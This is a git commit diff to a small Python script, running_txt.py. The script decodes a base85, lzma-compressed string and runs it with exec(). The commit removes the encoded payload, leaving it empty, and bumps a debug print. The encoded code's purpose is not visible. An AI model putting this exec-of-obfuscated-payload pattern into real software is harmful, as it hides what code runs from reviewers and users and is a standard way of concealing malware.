9a45b604934f3d1c934fd834d47a7bb4d3d3e503
AdmiraLahav <113438937+AdmiraLahav@users.noreply.github.com>
2025-12-24 19:44:53 +0200

    Update running_txt.py

--- txt_compression/running_txt.py
+++ txt_compression/running_txt.py
@@ -1,10 +1,10 @@
 import lzma
 import base64
 
-PAYLOAD = """{Wp48S^xk9=GL@E0stWa761SMbT8$j-~groe_a4Hn@VT6Qap3zWZcaQ#QWy)nykJrT8u(61MEwu2t>pZPw3lKwZdJ>;qb+gF(SBW-mSPkg_+XvD0JV>*BOYjiZ#9QU(q=dI)?Jaua!~(0(unMHnJ70WQZTx)I<jW6#%5<A>y^<-Nj3qHK2GZN14+QT&aGD8$0nHzyJUMS$JWCb)KQ;00El;rvU%}W>D%_vBYQl0ssI200dcD"""
+PAYLOAD = """"""
 
 code_bytes = lzma.decompress(base64.b85decode(PAYLOAD))
 exec(code_bytes.decode("utf-8"), {"__name__": "__main__"})
 
 
-print("HERE IS -------2")
+print("HERE IS -------3")
